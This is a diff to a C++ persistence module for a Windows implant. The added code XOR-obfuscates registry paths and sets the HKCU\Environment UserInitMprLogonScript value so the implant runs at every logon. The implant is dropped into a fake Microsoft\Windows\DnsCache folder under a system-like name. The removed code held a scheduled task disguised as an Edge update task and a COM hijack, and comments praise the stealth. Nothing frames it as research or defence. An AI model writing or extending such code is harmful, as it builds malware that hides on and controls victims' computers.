@@ -13,43 +13,49 @@
 namespace persistence {
 
 namespace {
+    // Registry Paths & Names (Encrypted)
+    // HKCU\Environment
+    const wchar_t kEnvKeyEnc[] = { 'E'^0x4B, 'n'^0x1F, 'v'^0x8C, 'i'^0x3E, 'r'^0x4B, 'o'^0x1F, 'n'^0x8C, 'm'^0x3E, 'e'^0x4B, 'n'^0x1F, 't'^0x8C };
+    // UserInitMprLogonScript
+    const wchar_t kLogonScriptEnc[] = { 'U'^0x4B, 's'^0x1F, 'e'^0x8C, 'r'^0x3E, 'I'^0x4B, 'n'^0x1F, 'i'^0x8C, 't'^0x3E, 'M'^0x4B, 'p'^0x1F, 'r'^0x8C, 'L'^0x3E, 'o'^0x4B, 'g'^0x1F, 'o'^0x8C, 'n'^0x3E, 'S'^0x4B, 'c'^0x1F, 'r'^0x8C, 'i'^0x3E, 'p'^0x4B, 't'^0x1F };
+    // Microsoft\Windows\DnsCache
+    const wchar_t kSubDirEnc[] = { 'M'^0x4B, 'i'^0x1F, 'c'^0x8C, 'r'^0x3E, 'o'^0x4B, 's'^0x1F, 'o'^0x8C, 'f'^0x3E, 't'^0x4B, '\\'^0x1F, 'W'^0x8C, 'i'^0x3E, 'n'^0x4B, 'd'^0x1F, 'o'^0x8C, 'w'^0x3E, 's'^0x4B, '\\'^0x1F, 'D'^0x8C, 'n'^0x3E, 's'^0x4B, 'C'^0x1F, 'a'^0x8C, 'c'^0x3E, 'h'^0x4B, 'e'^0x1F };
+    // sppextcomobj.exe
+    const wchar_t kExeNameEnc[] = { 's'^0x4B, 'p'^0x1F, 'p'^0x8C, 'e'^0x3E, 'x'^0x4B, 't'^0x1F, 'c'^0x8C, 'o'^0x3E, 'm'^0x4B, 'o'^0x1F, 'b'^0x8C, 'j'^0x3E, '.'^0x4B, 'e'^0x1F, 'x'^0x8C, 'e'^0x3E };
+    // {00021401-0000-0000-C000-000000000046} (Shell Link)
+    const wchar_t kBadClsid1Enc[] = { '{'^0x4B, '0'^0x1F, '0'^0x8C, '0'^0x3E, '2'^0x4B, '1'^0x1F, '4'^0x8C, '0'^0x3E, '1'^0x4B, '-'^0x1F, '0'^0x8C, '0'^0x3E, '0'^0x4B, '0'^0x1F, '-'^0x8C, '0'^0x3E, '0'^0x4B, '0'^0x1F, '0'^0x8C, '-'^0x3E, 'C'^0x4B, '0'^0x1F, '0'^0x8C, '0'^0x3E, '-'^0x4B, '0'^0x1F, '0'^0x8C, '0'^0x3E, '0'^0x4B, '0'^0x1F, '0'^0x8C, '0'^0x3E, '0'^0x4B, '0'^0x1F, '0'^0x8C, '4'^0x3E, '6'^0x4B, '}'^0x1F };
     // {21EC2020-3AEA-1069-A2DD-08002B30309D} (Work Folders)
-    const wchar_t kClsidEnc[] = { '{'^0x4B, '2'^0x1F, '1'^0x8C, 'E'^0x3E, 'C'^0x4B, '2'^0x1F, '0'^0x8C, '2'^0x3E, '0'^0x4B, '-'^0x1F, '3'^0x8C, 'A'^0x3E, 'E'^0x4B, 'A'^0x1F, '-'^0x8C, '1'^0x3E, '0'^0x4B, '6'^0x1F, '9'^0x8C, '-'^0x3E, 'A'^0x4B, '2'^0x1F, 'D'^0x8C, 'D'^0x3E, '-'^0x4B, '0'^0x1F, '8'^0x8C, '0'^0x3E, '0'^0x4B, '2'^0x1F, 'B'^0x8C, '3'^0x3E, '0'^0x4B, '3'^0x1F, '0'^0x8C, '9'^0x3E, 'D'^0x4B, '}'^0x1F };
-    // LocalServer32
-    const wchar_t kLocalServerEnc[] = { 'L'^0x4B, 'o'^0x1F, 'c'^0x8C, 'a'^0x3E, 'l'^0x4B, 'S'^0x1F, 'e'^0x8C, 'r'^0x3E, 'v'^0x4B, 'e'^0x1F, 'r'^0x8C, '3'^0x3E, '2'^0x4B };
-    // MicrosoftEdgeUpdateTaskMachineCore
-    const wchar_t kTaskNameEnc[] = { 'M'^0x4B, 'i'^0x1F, 'c'^0x8C, 'r'^0x3E, 'o'^0x4B, 's'^0x1F, 'o'^0x8C, 'f'^0x3E, 't'^0x4B, 'E'^0x1F, 'd'^0x8C, 'g'^0x3E, 'e'^0x4B, 'U'^0x1F, 'p'^0x8C, 'd'^0x3E, 'a'^0x4B, 't'^0x1F, 'e'^0x8C, 'T'^0x3E, 'a'^0x4B, 's'^0x1F, 'k'^0x8C, 'M'^0x3E, 'a'^0x4B, 'c'^0x1F, 'h'^0x8C, 'i'^0x3E, 'n'^0x4B, 'e'^0x1F, 'C'^0x8C, 'o'^0x3E, 'r'^0x4B, 'e'^0x1F };
-
-    // {00021401-0000-0000-C000-000000000046} (Shell Link - Cleanup)
-    const wchar_t kBadClsidEnc[] = { '{'^0x4B, '0'^0x1F, '0'^0x8C, '0'^0x3E, '2'^0x4B, '1'^0x1F, '4'^0x8C, '0'^0x3E, '1'^0x4B, '-'^0x1F, '0'^0x8C, '0'^0x3E, '0'^0x4B, '0'^0x1F, '-'^0x8C, '0'^0x3E, '0'^0x4B, '0'^0x1F, '0'^0x8C, '-'^0x3E, 'C'^0x4B, '0'^0x1F, '0'^0x8C, '0'^0x3E, '-'^0x4B, '0'^0x1F, '0'^0x8C, '0'^0x3E, '0'^0x4B, '0'^0x1F, '0'^0x8C, '0'^0x3E, '0'^0x4B, '0'^0x1F, '0'^0x8C, '4'^0x3E, '6'^0x4B, '}'^0x1F };
-    // InprocServer32 (Cleanup)
-    const wchar_t kInprocEnc[] = { 'I'^0x4B, 'n'^0x1F, 'p'^0x8C, 'r'^0x3E, 'o'^0x4B, 'c'^0x1F, 'S'^0x8C, 'e'^0x3E, 'r'^0x4B, 'v'^0x1F, 'e'^0x8C, 'r'^0x3E, '3'^0x4B, '2'^0x1F };
-
-    const wchar_t kSubDirEnc[] = { 'M'^0x4B, 'i'^0x1F, 'c'^0x8C, 'r'^0x3E, 'o'^0x4B, 's'^0x1F, 'o'^0x8C, 'f'^0x3E, 't'^0x4B, '\\'^0x1F, 'W'^0x8C, 'i'^0x3E, 'n'^0x4B, 'd'^0x1F, 'o'^0x8C, 'w'^0x3E, 's'^0x4B, '\\'^0x1F, 'D'^0x8C, 'n'^0x3E, 's'^0x4B, 'C'^0x1F, 'a'^0x8C, 'c'^0x3E, 'h'^0x4B, 'e'^0x1F }; // Microsoft\Windows\DnsCache
-    const wchar_t kExeNameEnc[] = { 'd'^0x4B, 'n'^0x1F, 's'^0x8C, 'c'^0x3E, 'o'^0x4B, 'n'^0x1F, 'f'^0x8C, '.'^0x3E, 'e'^0x4B, 'x'^0x1F, 'e'^0x8C }; // dnsconf.exe
+    const wchar_t kBadClsid2Enc[] = { '{'^0x4B, '2'^0x1F, '1'^0x8C, 'E'^0x3E, 'C'^0x4B, '2'^0x1F, '0'^0x8C, '2'^0x3E, '0'^0x4B, '-'^0x1F, '3'^0x8C, 'A'^0x3E, 'E'^0x4B, 'A'^0x1F, '-'^0x8C, '1'^0x3E, '0'^0x4B, '6'^0x1F, '9'^0x8C, '-'^0x3E, 'A'^0x4B, '2'^0x1F, 'D'^0x8C, 'D'^0x3E, '-'^0x4B, '0'^0x1F, '8'^0x8C, '0'^0x3E, '0'^0x4B, '2'^0x1F, 'B'^0x8C, '3'^0x3E, '0'^0x4B, '3'^0x1F, '0'^0x8C, '9'^0x3E, 'D'^0x4B, '}'^0x1F };
 
     std::wstring GetPersistencePath() {
         wchar_t path[MAX_PATH];
         if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
-            return std::wstring(path) + L"\\" + utils::DecryptW(kSubDirEnc, 26) + L"\\" + utils::DecryptW(kExeNameEnc, 11);
+            return std::wstring(path) + L"\\" + utils::DecryptW(kSubDirEnc, 26) + L"\\" + utils::DecryptW(kExeNameEnc, 16);
         }
         return L"";
     }
 
-    bool InstallScheduledTask(const std::wstring& implantPath) {
-        std::wstring taskName = utils::DecryptW(kTaskNameEnc, 34);
-        // Use a less suspicious command: daily at a random time, or on logon.
-        // We'll use onlogon for reliability.
-        std::wstring cmd = L"schtasks /create /tn \"" + taskName + L"\" /tr \"" + implantPath + L"\" /sc onlogon /f";
-        return WinExec(utils::ws2s(cmd).c_str(), SW_HIDE) > 31;
+    bool InstallLogonScript(const std::wstring& implantPath) {
+        HKEY hKey;
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kEnvKeyEnc, 11).c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            std::wstring valName = utils::DecryptW(kLogonScriptEnc, 22);
+            LSTATUS status = RegSetValueExW(hKey, valName.c_str(), 0, REG_SZ, (LPBYTE)implantPath.c_str(), (DWORD)(implantPath.length() + 1) * sizeof(wchar_t));
+            RegCloseKey(hKey);
+            return status == ERROR_SUCCESS;
+        }
+        return false;
     }
 }
 
 std::wstring establishPersistence(const std::wstring& overrideSourcePath) {
-    LOG_INFO("Establishing stealthy persistence...");
+    LOG_INFO("Establishing persistence...");
 
-    // Cleanup bad Shell Link hijack from previous versions to restore system functionality
-    ComHijacker::Uninstall(utils::DecryptW(kBadClsidEnc, 38), utils::DecryptW(kInprocEnc, 14));
+    // 1. Cleanup all previous bad hijacks to restore system stability
+    std::wstring inproc = L"InprocServer32";
+    std::wstring localSrv = L"LocalServer32";
+    ComHijacker::Uninstall(utils::DecryptW(kBadClsid1Enc, 38), inproc);
+    ComHijacker::Uninstall(utils::DecryptW(kBadClsid2Enc, 38), localSrv);
+    ComHijacker::Uninstall(utils::DecryptW(kBadClsid2Enc, 38), inproc);
 
     std::wstring targetPath = GetPersistencePath();
     if (targetPath.empty()) return L"";
@@ -79,16 +85,9 @@ std::wstring establishPersistence(const std::wstring& overrideSourcePath) {
         }
     }
 
-    // Method 1: Scheduled Task (Primary)
-    if (InstallScheduledTask(targetPath)) {
-        LOG_INFO("Scheduled Task success.");
-    }
-
-    // Method 2: COM Hijack (Secondary, safer CLSID)
-    std::wstring clsid = utils::DecryptW(kClsidEnc, 38);
-    std::wstring subkey = utils::DecryptW(kLocalServerEnc, 13);
-    if (ComHijacker::Install(targetPath, clsid, subkey)) {
-        LOG_INFO("COM Hijack success: " + utils::ws2s(clsid));
+    // Method: UserInitMprLogonScript (Very stealthy, triggers on logon)
+    if (InstallLogonScript(targetPath)) {
+        LOG_INFO("Logon Script persistence success.");
     }
 
     return targetPath;
